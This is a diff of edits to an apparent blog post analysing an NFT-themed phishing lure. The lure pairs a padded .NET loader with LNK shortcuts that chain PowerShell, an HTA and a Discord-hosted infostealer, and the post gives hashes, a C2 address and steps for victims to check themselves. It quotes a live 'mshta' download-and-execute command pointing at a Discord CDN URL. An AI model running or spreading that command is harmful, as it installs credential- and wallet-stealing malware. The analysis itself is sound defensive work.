@@ -7,16 +7,16 @@
 
 ## Background
 
-The NFT world became extremely notorious during the course of 2021, and for many different reasons. One of them is money: the amount of it that is moved every day by NFT vendors, brokers and producers made it possible to create a whole new market. The demand for NFT has skyrocketed and VFX artists have moved towards it, creating NFTs for companies and for their own.
+The NFT world became extremely notorious during the course of 2021, and for many different reasons. One of them is money: the amount of it that is moved every day by NFT vendors, brokers and producers made it possible for a whole new market to stem. The demand for NFT has skyrocketed and VFX artists have moved towards it, creating NFTs for companies and for their own.
 
 The nature of NFTs and, more generally, the cryptocurrency world unfortunately attract lots of criminals that are willing to go long ways to scam people and steal their cryptocurrencies. In this instance, a popular NFT artist was approached by an individual claiming to be associated with a game developing firm (Wargaming), who offered to work on a project about NFTs. This individual eventually shared a folder allegedly containing sketches and information about the company. At this point, once realised that the files in the folder were odd, this person reached out to me asking to take a look, which I much happily did. The result of the files' analysis is presented below.
 
 Some key aspects are available here:
 
-* the Threat Actor (TA) is familiar with the NFT ecosystem, and knows how to use the jargon specific to the NFT markets
+* the Threat Actor (TA) is familiar with the NFT ecosystem, and knows how to use the jargon specific to the NFT market
 * the TA is using commodity malware and is therefore not sophisticated
 * the TA is using some anti-analysis techniques such as code obfuscation, shortcut modification and filesize inflation
-* the TA is also using Discord's CDN to store their payloads
+* the TA is using Discord's CDN to store their payloads
 * The TA is only interested in data related to browsers (cookies, passwords,...) and cryptocurrency (wallets, credentials,...)
 
 ## Initial archive
@@ -30,21 +30,11 @@ The archive initially shared with the victim is password protected. The followin
 | SHA1       | ac8583c42ebe918e3a8e2d0df78819d2c34d6e7b|
 | SHA256     | df899b52549a484b5f5be15743a85582eba54a2149f88b9790da60c927af5104|
 
-Upon extraction, the content, displayed below, are a file and folder named `Sketch Pack` with three more files.
-
-C:.
-│   `Wargaming_nft_presentation_for_artist - www.clound.com`
-│
-└───`Sketch Pack`
-        `sketch_nn_wot_tank1.png.lnk`
-        `sketch_nn_wot_tank2.png.lnk`
-        `sketch_nn_wot_tank3.png.lnk`
-
-In the following chapters a closer inspection of the files is presented.
+Upon extraction, the archive's contents are a file named `Wargaming_nft_presentation_for_artist - www.clound.com`, and folder named `Sketch Pack` with three more files inside. In the following chapters a closer inspection of the files is presented.
 
 ## 500 Mb of nothing
 
-The file `Wargaming_nft_presentation_for_artist - www.clound.com`, despite its name, is an MS-DOS application and is not really 500 Mb in size, as opposed to what appears on Windows. In fact, the file was filled with null-bytes to purposely thwart automated analysis by Antivirus tools, which tyipically have a size limit (ref: https://capec.mitre.org/data/definitions/572.html). Looking at it in a Hex editor, one can clearly see that is has a legitimate MZ header, but also that the majority of the file is empty. This is clearly evident in Pe-bear.
+The file `Wargaming_nft_presentation_for_artist - www.clound.com`, despite its name, is an MS-DOS application and is not really 500 Mb in size, as opposed to what appears on Windows. In fact, the file was filled with null-bytes to [purposely thwart](https://capec.mitre.org/data/definitions/572.html) automated analysis by Antivirus tools, which tyipically have a size limit. Looking at it in a Hex editor, one can clearly see that is has a legitimate MZ header, but also that the majority of the file is empty. This is clearly evident in Pe-bear.
 
 ![alt text](https://raw.githubusercontent.com/splashdot/splashdot.github.io/master/NFT/images/presentation_empty.png)<br />
 
@@ -57,11 +47,11 @@ The file's details are shown in the table below.
 | SHA1       | bcff8fc3b1e98c10b168fcb5c61a56b51092dda1|
 | SHA256     | 087f89fb729da54b2f2e2f68266c2f4fa51f7b14ecb5d6b7b0c550d9f8d64e88|
 
-The binary is a Portable Executable (PE) written in dotNET, and can be entirely decompiled. Although it appears to employ some basic obfuscation, the code is easy to read and immediately tells us the main purpose of the binary in this `case-switch` contained in the `Main()`:
+The binary is a Portable Executable (PE) written in dotNET, and can be entirely decompiled. Although it appears to employ some basic obfuscation, the code is easy to read and immediately tells us the main purpose of the binary in this `switch` statement contained in the `Main()`:
 
 ![alt text](https://raw.githubusercontent.com/splashdot/splashdot.github.io/master/NFT/images/discord_download.png)<br />
 
-It downloads a file with `.png` extension from Discord, reverses it and treats is like a ByteArray. Doesn't really sound like a PNG, does it? Take a look at the file last bytes:
+It downloads a file with `.png` extension from Discord, reverses it and treats is like a ByteArray. Doesn't really sound like a PNG, does it? Take a look at the file's last bytes:
 
 ![alt text](https://raw.githubusercontent.com/splashdot/splashdot.github.io/master/NFT/images/dll.png)<br />
 
@@ -100,7 +90,7 @@ The Powershell script contains two arrays that are turned into characters by the
 
 ![alt text](https://raw.githubusercontent.com/splashdot/splashdot.github.io/master/NFT/images/powershell_shortcut.png)<br />
 
-The smaller one (`$ac`) translates to `IEX`, while the other (`$es`) is `mshta https://cdn.discordapp.com/attachments/930485322846986240/930495210625064990/pngsuka.hta`. So, the script downloads and executes an HTA application. `pngsuka.hta` contains obfuscated VBScript (which is trivial to deobfuscate), and it's around 600 lines long. Much like the initial PowerShell, this VBScript translates a long array into characters and executes it. The result is yet more obfuscated PowerShell, that aims at downloading, saving and executing a PE file from a Discord CDN. The function responsible for downloading and executing the file is displayed in the following image.
+The smaller one (`$ac`) translates to `IEX`, while the other (`$es`) is `mshta https://cdn.discordapp.com/attachments/930485322846986240/930495210625064990/pngsuka.hta`. So, the script downloads and executes an HTA application. `pngsuka.hta` contains obfuscated VBScript, and it's around 600 lines long. Much like the initial PowerShell, this VBScript translates a long array into characters and executes it. The result is yet more obfuscated PowerShell, that aims at downloading, saving and executing a PE file from a Discord CDN. The function responsible for downloading and executing the file is displayed in the following image.
 
 ![alt text](https://raw.githubusercontent.com/splashdot/splashdot.github.io/master/NFT/images/powershell.png)<br />
 
@@ -126,7 +116,9 @@ The final payload is an information stealer that contacts the Threat Actor's Com
 The data the malware looks for can be separated into three categories:
 
 i) all the files with extension `.txt`, `.key`, `.wallet`, `.seed` located in `%userprofile%\Desktop` and `%userprofile%\Documents`.
+
 ii) all the files in the folder `%USERPROFILE%\AppData\Local\$name\User Data` and `%USERPROFILE%\AppData\Roaming\$name`, where `$name` indicates browsers (such as Chromium, YandexBrowser, Vivaldi,...) and other programs (such as NVIDIA GeForce Experience, Steam and Thunderbird).
+
 iii) cryptocurrency wallets (e.g., Electrum, Exodus, Atomic,...).
 
 In essence, the Threat Actor is stealing credentials, cookies, documents, licenses, and many more from infected PCs.
@@ -136,9 +128,10 @@ In essence, the Threat Actor is stealing credentials, cookies, documents, licens
 Look in the following paths:
 
 -`\Microsoft\Windows\Start Menu\Programs\` for a folder named `mplayer` with an executable named `mplayer.exe`
+
 -`%temp%` for an executable file more than 500Mb in size named something like `Wargaming_nft_presentation_for_artist - www.clound.com`
 
-If you have matching files in these locations, it means you were infected. In case you have some kind of network logs, look for communication with the IP `185.215.113.15` on port `8080`.
+If you have matching files in these locations, it means you were infected. In case you have network logs, look for communication with the IP `185.215.113.15` on port `8080`.
 
 ### What can I do?
 
